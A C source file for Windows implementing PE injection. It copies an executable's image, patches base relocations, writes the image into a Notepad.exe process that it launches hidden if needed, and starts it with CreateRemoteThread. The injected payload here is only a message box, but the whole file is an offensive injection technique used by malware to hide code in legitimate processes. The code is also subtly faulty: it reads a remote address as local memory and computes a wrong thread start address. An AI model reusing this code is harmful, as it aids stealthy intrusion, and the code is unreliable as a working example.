#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;


DWORD InjectionEntryPoint(LPVOID lpParameter) {
    CHAR moduleName[128] = "";
    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
    MessageBoxA(NULL, moduleName, "Obligatory PE Injection", MB_OK);
    return 0;
}

// Function to get the PID of a process by its name
DWORD get_pid_by_name(const char *proc_name) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    DWORD pid = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed, error: %ld\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError());
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, proc_name) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return pid;
}

// Function to launch a process in a hidden state
void LaunchHiddenProcess(const char *processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, (LPSTR)processName, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcess failed, error: %lu\n", GetLastError());
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

DWORD_PTR GetBaseAddress(HANDLE hProcess) {
    if (hProcess == NULL)
        return 0; // Không có quyền truy cập vào tiến trình, trả về 0

    HMODULE lphModule[1024]; // Mảng lưu danh sách các handle của mô-đun
    DWORD lpcbNeeded = 0; // Số byte cần thiết để lưu tất cả các handle mô-đun trong mảng lphModule

    // Gọi EnumProcessModules để lấy danh sách các mô-đun
    if (!EnumProcessModules(hProcess, lphModule, sizeof(lphModule), &lpcbNeeded))
        return 0; // Không thể đọc các mô-đun

    // Lấy thông tin mô-đun đầu tiên (thường là mô-đun chính - EXE)
    CHAR szModName[MAX_PATH];
    if (!GetModuleFileNameExA(hProcess, lphModule[0], szModName, sizeof(szModName)))
        return 0; // Không thể lấy thông tin mô-đun

    return (DWORD_PTR)lphModule[0]; // Trả về địa chỉ cơ sở của mô-đun (mô-đun đầu tiên là EXE)
}

DWORD RunAndPauseProcess(LPCSTR exePath) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create the process
    if (!CreateProcessA(exePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%lu).\n", GetLastError());
        return 0; // Return 0 to indicate failure
    }

    printf("Process started and paused. PID: %lu\n", pi.dwProcessId);

    // Close handles that are not needed
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Return the Process ID
    return pi.dwProcessId;
}

int main() {
    char exePath[] = "D:\\Workspace\\C++\\Injection\\test.exe";

    DWORD basePID = RunAndPauseProcess(exePath);
    HANDLE baseProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, basePID);
    //PVOID imageBase = GetModuleHandle(NULL);
    //Sleep(5000);
    PVOID imageBase = (PVOID)GetBaseAddress(baseProcess);
    if(imageBase == 0) {
        printf("Error 1\n");
        CloseHandle(baseProcess);
        return 1;
    }
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    DWORD pid = get_pid_by_name("Notepad.exe");

    if (pid == 0) {
        LaunchHiddenProcess("Notepad.exe");
        Sleep(5000);
        pid = get_pid_by_name("Notepad.exe");
    }
    if (pid == 0)
        return 0;

    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    printf("Start relo!\n");
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    while (relocationTable->SizeOfBlock > 0) {
        DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        for (DWORD i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }
    printf("Finish relo!\n");

    if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
        printf("Error 2\n");
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(baseProcess);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    DWORD_PTR injectionEntryPointAddress = (DWORD_PTR)imageBase + deltaImageBase;
    HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
    if (remoteThread == NULL) {
        printf("Error 3\n");
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(baseProcess);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    printf("Success!\n");
    WaitForSingleObject(remoteThread, INFINITE);
    //Sleep(5000);

    CloseHandle(baseProcess);
    CloseHandle(remoteThread);
    VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
    CloseHandle(targetProcess);
    VirtualFree(localImage, 0, MEM_RELEASE);

    return 0;
}
